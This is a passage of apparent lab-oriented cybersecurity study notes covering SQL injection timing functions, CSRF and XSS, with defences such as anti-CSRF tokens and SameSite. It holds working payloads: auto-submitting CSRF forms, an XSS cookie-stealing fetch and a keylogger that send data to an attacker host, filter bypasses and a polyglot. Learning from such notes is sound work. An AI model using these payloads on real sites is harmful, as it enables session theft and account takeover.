                                                                         Deduce strings via SLEEP()

```

### Core Cross-Engine Reference

| Database Engine | Single-Line Comment Syntax | Time-Delay Functions | Metadata System Directory |
| --- | --- | --- | --- |
| **MySQL / MariaDB** | `-- ` (with space) <br>

<br> `#` | `SLEEP(5)` | `information_schema` |
| **PostgreSQL** | `--` | `pg_sleep(5)` | `information_schema` |
| **Microsoft SQL Server** | `--` | `WAITFOR DELAY '0:0:5'` | `information_schema` or `sys.tables` |
| **SQLite** | `--` | `randomblob(100000000)` | `sqlite_master` |
| **Oracle** | `--` | `dbms_pipe.receive_message` | `all_tables` |

---

This module covers **Cross-Site Request Forgery (CSRF)**, a vulnerability that occurs when a malicious website tricks a user's web browser into performing an unwanted, authenticated action on a trusted application.

Here is a comprehensive, structured reference guide to add to your cybersecurity notes.

---

## 🏗️ The Mechanics of CSRF

CSRF does not rely on stealing a user's credentials or session tokens. Instead, it exploits the implicit trust relationship between a web application and the victim's browser.

### 1. Why CSRF Works: Automatic Cookie Handling

When a user logs into a web application, the server generates an identity state and drops a session cookie into the browser. By default design, **the browser automatically attaches this session cookie to every subsequent HTTP request directed to that specific domain.**

The browser cannot distinguish intent; it does not care if an HTTP request was initiated by clicking an authentic button on the legitimate site or triggered via a hidden script running on an entirely separate, malicious tab. If the request is bound for the target domain, the cookie is attached.

### 2. The 3 Pillars of a Successful CSRF Attack

For an application endpoint to be exploitable via CSRF, three fundamental conditions must align:

1. **Active Authentication Context:** The target victim must possess a live, authenticated session session cookie with the target application.
2. **State-Changing Impact:** The endpoint must execute an absolute mutation of data (e.g., modifying email addresses, transferring financial funds, or resetting privileges). Read-only requests (`GET` data views) are rarely meaningful targets.
3. **Predictable Query Parameters:** The target request payload must contain exclusively predictable parameters. If the query parameters can be completely mapped by an attacker, they can be accurately forged.

---

## 🗺️ Common Attack Delivery Methods

Attackers deliver CSRF payloads by structuring malicious HTML documents or event triggers that simulate legitimate application forms.

### 1. Hidden Auto-Submitting Forms (`POST` Vectors)

Many developers assume switching data actions from `GET` to `POST` neutralizes CSRF risks. This is false. Attackers easily construct hidden forms on external pages and automate submission using JavaScript upon document loading.

```html
<html>
  <body>
    <form action="http://staffhub.thm:8080/update_email.php" method="POST" id="attack">
      <input type="hidden" name="email" value="attacker@evilmail.thm">
    </form>
    
    <script>
      // Instantly fire the form transaction silently behind the scenes
      document.getElementById("attack").submit();
      
      // Optional: Redirect the user back to prevent obvious suspicion
      setTimeout(function() {
          window.location.href = "http://staffhub.thm:8080/settings.php";
      }, 1000);
    </script>
  </body>
</html>

```

### 2. Image and Interaction Triggers (`GET` & Event Vectors)

If sensitive state changes are handled improperly via `GET` requests, execution is trivial—often requiring nothing more than embedding a standard media reference tag `<img src="...">`.

If the application expects a token but derives it using a weak, reversible algorithm (e.g., a static base64 string of a user's role like `YWRtaW4=` $\rightarrow$ `admin`), an attacker can pre-calculate the token and bind it to visual DOM event triggers:

```html
<html>
  <body>
    <h2>StaffHub Internal Notice</h2>
    <p>Move your mouse over the banner below to load the latest updates.</p>
    
    <img src="http://staffhub.thm:8080/one.png" 
         onmouseover="window.location='http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4='" 
         width="400">
  </body>
</html>

```

---

## 🔎 Pentesting Methodology: Spotting CSRF Vulnerabilities

During an offensive assessment, follow this structured blueprint to evaluate endpoints for missing or weak anti-CSRF controls:

```
[1. Map Data State Changes] ──► Audit account settings, email/password resets, profile adjustments.
              │
[2. Analyze Token Presence] ──► Is there a 'csrf_token' field? If absent, the endpoint is likely vulnerable.
              │
[3. Test Token Robustness]  ──► Attempt decoding (Base64, MD5). Check if tokens are static or re-usable.
              │
[4. Verify Outside Context] ──► Replicate the raw HTTP request layout in an isolated, external local HTML file.
              │
[5. Launch Proof-of-Concept]──► Execute the standalone form while logged into the app. Confirm if data updates.

```

1. **Prioritize State Changes:** Map out the target application and isolate parameters that handle user settings, credential changes, or account parameters.
2. **Deconstruct Token Properties:** If a token field exists (e.g., `csrf_token`), audit its generation framework. Is it truly random, or is it predictable (e.g., tracking timestamps or user IDs)?
3. **Evaluate Cookie Attributes:** Inspect the session configuration flags. If cookies do not specify isolation boundaries, the endpoint relies solely on implicit trust.

---

## 🛡️ Defensive Engineering: Preventing CSRF

Securing applications against request forgery requires explicit validation layers that verify request origin authenticity.

### 1. Anti-CSRF Tokens (The Synchronizer Token Pattern)

The primary protection mechanism involves assigning a unique, unpredictable, and cryptographically secure pseudo-random value to each authenticated session.

* **The Process:** When the application renders a form, it inserts this session token into a hidden field. When the form is submitted, the server evaluates the inbound parameter against the token bound securely within the user's active server-side session.
* **Why it stops attacks:** Since an external malicious webpage cannot read across domains to steal the unique value, any forged request they emit will lack the correct token value and be dropped immediately by the server.

### 2. Utilizing the `SameSite` Cookie Attribute

Modern browsers support the `SameSite` attribute within the `Set-Cookie` HTTP header configuration. This explicitly dictates cookie transmission behaviors during cross-site requests:

| SameSite Policy | Transmission Behavior | Security Posture |
| --- | --- | --- |
| **`SameSite=None`** | Cookies are automatically attached to all third-party, cross-site requests. | **Highly Vulnerable**; requires separate token defenses. |
| **`SameSite=Lax`** | Cookies are omitted on cross-site sub-resource requests (like images/forms) but attached when navigating *to* the site via top-level link clicks. | **Standard Default**; blocks basic automated script execution. |
| **`SameSite=Strict`** | Cookies are entirely withheld from any cross-site request. If you click a link pointing to the site from an external domain, you initially appear unauthenticated. | **Maximum Security**; ideal for highly sensitive administrative panels. |

### 3. Additional Defense-in-Depth Measures

* **Custom Headers:** Modern web application architectures (like Single Page Apps) validate requests by enforcing custom API headers (e.g., `X-Requested-With: XMLHttpRequest`). Browsers restrict external cross-site forms from attaching custom headers without passing explicit Cross-Origin Resource Sharing (CORS) pre-flight pre-conditions.
* **Re-Authentication Prompts:** For critical operations (e.g., updating account passwords or modifying financial routing), always force users to re-enter their existing credentials or complete a secondary verification factor.

  ---

   **Cross-Site Scripting (XSS)**

---

#  Cross-Site Scripting (XSS) Core Methodology

## 1. The Architectural Core

To exploit or defend against XSS, you must understand how the browser processes structures, holds session identities, and distinguishes data from executable instructions.

### 🔹 Document Object Model (DOM)

The DOM is the browser’s live, in-memory, structured blueprint of a web page represented as a tree of elements (tags, text attributes). When client-side JavaScript reads or modifies the DOM, the visible layout updates dynamically in real time.

### 🔹 Browser Cookies & `HttpOnly`

Cookies store lightweight local strings (session IDs, preferences). If a session identifier cookie lacks defenses, injected JavaScript can access it via `document.cookie`.

* **The Shield:** The **`HttpOnly`** flag is a backend-set instruction telling the browser that the cookie must *never* be exposed to client-side scripts, completely neutralizing session-stealing via XSS.

### 🔹 Escaping vs. Filtering

* **Escaping (Output Encoding):** The definitive defense. It maps raw characters into safe literals before rendering (e.g., converting `<` to `&lt;` and `>` to `&gt;`). The browser prints `<script>` as harmless plain text rather than compiling an executable tag block.
* **Filtering (Input Validation):** A perimeter sanity-check evaluating if an input matches strict rules (length, digits, character boundaries). It drops known bad strings but is prone to context-dependent bypasses.

---

## 2. Anatomy of an XSS Payload

An XSS payload is an arbitrary JavaScript snippet injected into an untrusted parameter that tricks the browser into executing code under the site's unique security origin. Payloads consist of two operational dimensions:

1. **Intention:** The payload's ultimate goal (e.g., creating a Proof-of-Concept pop-up, logging keystrokes, or exfiltrating data).
2. **Modification (Context Escaping):** Altering the syntax structure so the payload breaks cleanly out of existing HTML tags, value attributes, or native script barriers.

### Core Intentional Vectors

* **Proof-of-Concept (PoC):** Verifies code execution.
```html
<script>alert('XSS')</script>

```


* **Session Exfiltration:** Base64-encodes (`btoa()`) session identities and beams them outward to an attacker's server.
```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

```


* **DOM Keylogger:** Hooks into keyboard event registers to capture input telemetry silently.
```html
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key)); }</script>

```



---

## 3. The Four Pillars of XSS Classification

XSS flaws are sorted by how the data payload travels through the application lifecycle before executing in a victim's browser context.

### 1️⃣ Reflected XSS

* **The Flow:** The application takes user-supplied input from an immediate HTTP request parameter (like a URL query string `?q=`) and instantly echoes it back inside the HTTP response body without sanitization.
* **Delivery:** Requires tricking a user into interacting with a crafted link or submitting a malicious form link (`https://site.com/search?q=<script>...`).

### 2️⃣ Stored (Persistent) XSS

* **The Flow:** The application accepts an input, writes it permanently into a persistent backend storage engine (database, message log, file system), and later pulls that raw string out to render it to other users or administrators.
* **Delivery:** Highly critical; zero ongoing user interaction is required once planted. Affects anyone loading the compromised page (e.g., comments, profiles, product reviews).

### 3️⃣ DOM-Based XSS

* **The Flow:** The vulnerability executes entirely inside the client-side browser environment. Client-side JavaScript reads data from a controllable client DOM **Source** (like `location.search` or `location.hash`) and unsafe-writes it directly into a dangerous rendering **Sink** (like `innerHTML` or `document.write`).
* **Delivery:** The payload never needs to touch or process through the server's backend infrastructure.

### 4️⃣ Blind XSS

* **The Flow:** A subterranean variant of Stored XSS. The attacker injects a payload into an input field (like a feedback form or support ticket descriptor), but lacks access to view the output page. Instead, the payload is rendered later inside a completely private application boundary (like an internal admin dashboard or log management portal).
* **Delivery:** Requires an out-of-band network callback (like an external HTTP `fetch` or DNS beacon) to notify the tester when and where the payload triggers.

---

## 4. Context Escaping & Filter Bypass Manual

When an application drops input inside tags rather than an open HTML body, you must adapt your input structure to re-establish an executable scripting context.

### Context 1: Standard Input Value Attributes

* **The Scenario:** Your input is placed inside the value assignment of an input field: `<input type="text" name="username" value="YOUR_INPUT">`
* **The Escape:** Close out the parameter quote and close the entire parent HTML tag structure first:
```html
"><script>alert('THM');</script>

```



### Context 2: Textarea Boundaries

* **The Scenario:** Input falls within raw text container tags: `<textarea>YOUR_INPUT</textarea>`
* **The Escape:** You must explicitly close the open container tag to force the browser back into an HTML parsing mode before opening a new script tag:
```html
</textarea><script>alert('THM');</script>

```



### Context 3: Direct JavaScript Reflection

* **The Scenario:** Input is dropped straight into an existing variable string inside a script element block: `let currentProfile = 'YOUR_INPUT';`
* **The Escape:** Balance out the open string quote, terminate the active variable statement using a semicolon, write your standalone payload, and convert all trailing leftovers into inline comments (`//`):
```javascript
';alert('THM');//

```



### Context 4: Recursive Stripping Filters

* **The Scenario:** The server employs a naive, single-pass blocklist filter that looks for `<script>` strings and deletes them entirely.
* **The Escape:** Nest the blacklisted term recursively inside itself. When the engine slices out the inner core, the surrounding outer fragments collapse together to form a fully operational tag:
```html
<sscriptcript>alert('THM');</sscriptcript>

```



### Context 5: Angle Bracket Elimination (`<` and `>` Blocked)

* **The Scenario:** The server explicitly drops or escapes `<` and `>`, preventing the generation of new HTML tags, but leaves quotes intact.
* **The Escape:** Leverage additional event attributes native to elements like images, inputs, or body tags to prompt code execution via inline event triggers (e.g., `onload`, `onerror`, `onmouseover`):
```html
/images/cat.jpg" onload="alert('THM');

```



---

## 📋 XSS Universal Polyglot Reference

An **XSS Polyglot** is a single, highly dense string engineered to break out of multiple attribute scopes, scripts, styles, textareas, and tag boundaries simultaneously while routing around common keywords and character filters. Pentesters throw these at complex endpoints to test multiple execution contexts at once:

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e

```
